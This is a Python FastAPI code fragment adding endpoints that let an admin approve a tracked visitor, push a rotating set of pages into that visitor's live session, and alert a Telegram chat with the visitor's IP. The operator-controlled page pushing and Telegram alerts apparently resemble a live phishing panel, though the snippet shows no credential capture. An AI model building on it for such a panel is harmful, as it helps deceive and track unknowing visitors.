# Backend Enhancement for Page Rotation
# Add these Pydantic models and API endpoints to server.py

# ── Add to Pydantic Models section ────────────────────────────────────────────

class PageRotationRequest(BaseModel):
    page_ids: List[str]
    interval_ms: int = 5000


# ── Add these endpoints after the existing /visitors/{visitor_id}/approve endpoint ────────────────────

@api_router.put("/visitors/{visitor_id}/approve/rotate")
async def approve_visitor_with_rotation(visitor_id: str, body: PageRotationRequest):
    """
    Approve a visitor and start page rotation through multiple pages.
    Supports up to 6 pages that rotate at specified intervals.
    """
    visitor = await db.visitors.find_one({"id": visitor_id}, {"_id": 0})
    if not visitor:
        raise HTTPException(status_code=404, detail="Visitor not found")
    
    if not body.page_ids or len(body.page_ids) < 2 or len(body.page_ids) > 6:
        raise HTTPException(status_code=400, detail="Must provide 2-6 page IDs")
    
    # Verify all pages exist
    for page_id in body.page_ids:
        page = await db.pages.find_one({"id": page_id}, {"_id": 0})
        if not page:
            raise HTTPException(status_code=404, detail=f"Page {page_id} not found")
    
    # Update visitor with rotation info
    update_data = {
        "status": "approved",
        "last_seen": now_iso(),
        "rotation_pages": body.page_ids,
        "rotation_interval": body.interval_ms,
        "current_page_index": 0,
        "is_rotating": True
    }
    
    await db.visitors.update_one({"id": visitor_id}, {"$set": update_data})
    
    # Get first page content
    page = await db.pages.find_one({"id": body.page_ids[0]}, {"_id": 0})
    page_content = page.get("content") if page else None
    
    # Notify visitor of approval with rotation mode
    await manager.notify_visitor(visitor["session_id"], {
        "event": "approved",
        "page_content": page_content,
        "rotation_mode": True,
        "page_ids": body.page_ids,
        "interval_ms": body.interval_ms,
        "current_page_index": 0
    })
    
    await manager.broadcast_admins({
        "event": "visitor_updated",
        "visitor_id": visitor_id,
        "status": "approved",
        "rotation_mode": True
    })
    
    await send_telegram(f"<b>Visitor Approved (Rotation)</b>\nIP: <code>{visitor['ip']}</code>\nPages: {len(body.page_ids)} (rotating every {body.interval_ms}ms)")
    await create_alert("visitor", f"Visitor {visitor['ip']} approved with rotation ({len(body.page_ids)} pages)", "info")
    
    return {"success": True, "rotation_mode": True, "pages": len(body.page_ids)}


@api_router.put("/visitors/{visitor_id}/rotation/next")
async def rotate_to_next_page(visitor_id: str):
    """Manually advance to the next page in rotation."""
    visitor = await db.visitors.find_one({"id": visitor_id}, {"_id": 0})
    if not visitor:
        raise HTTPException(status_code=404, detail="Visitor not found")
    
    if not visitor.get("is_rotating"):
        raise HTTPException(status_code=400, detail="Visitor is not in rotation mode")
    
    rotation_pages = visitor.get("rotation_pages", [])
    current_index = visitor.get("current_page_index", 0)
    next_index = (current_index + 1) % len(rotation_pages)
    
    # Update current index
    await db.visitors.update_one(
        {"id": visitor_id},
        {"$set": {"current_page_index": next_index, "last_seen": now_iso()}}
    )
    
    # Get next page content
    next_page_id = rotation_pages[next_index]
    page = await db.pages.find_one({"id": next_page_id}, {"_id": 0})
    page_content = page.get("content") if page else None
    
    # Notify visitor of page change
    await manager.notify_visitor(visitor["session_id"], {
        "event": "rotate_page",
        "page_content": page_content,
        "page_index": next_index,
        "total_pages": len(rotation_pages)
    })
    
    return {"success": True, "page_index": next_index, "total_pages": len(rotation_pages)}


@api_router.put("/visitors/{visitor_id}/rotation/stop")
async def stop_page_rotation(visitor_id: str):
    """Stop page rotation and keep visitor on current page."""
    visitor = await db.visitors.find_one({"id": visitor_id}, {"_id": 0})
    if not visitor:
        raise HTTPException(status_code=404, detail="Visitor not found")
    
    # Update rotation status
    await db.visitors.update_one(
        {"id": visitor_id},
        {"$set": {
            "is_rotating": False,
            "rotation_pages": None,
            "current_page_index": 0,
            "last_seen": now_iso()
        }}
    )
    
    # Get current page to freeze it
    current_index = visitor.get("current_page_index", 0)
    rotation_pages = visitor.get("rotation_pages", [])
    
    if rotation_pages and current_index < len(rotation_pages):
        page_id = rotation_pages[current_index]
        page = await db.pages.find_one({"id": page_id}, {"_id": 0})
        page_content = page.get("content") if page else None
    else:
        page_content = None
    
    # Notify visitor to stop rotation
    await manager.notify_visitor(visitor["session_id"], {
        "event": "stop_rotation",
        "page_content": page_content
    })
    
    await manager.broadcast_admins({
        "event": "visitor_updated",
        "visitor_id": visitor_id,
        "status": "approved",
        "rotation_mode": False
    })
    
    await create_alert("visitor", f"Visitor {visitor['ip']} rotation stopped", "info")
    
    return {"success": True}
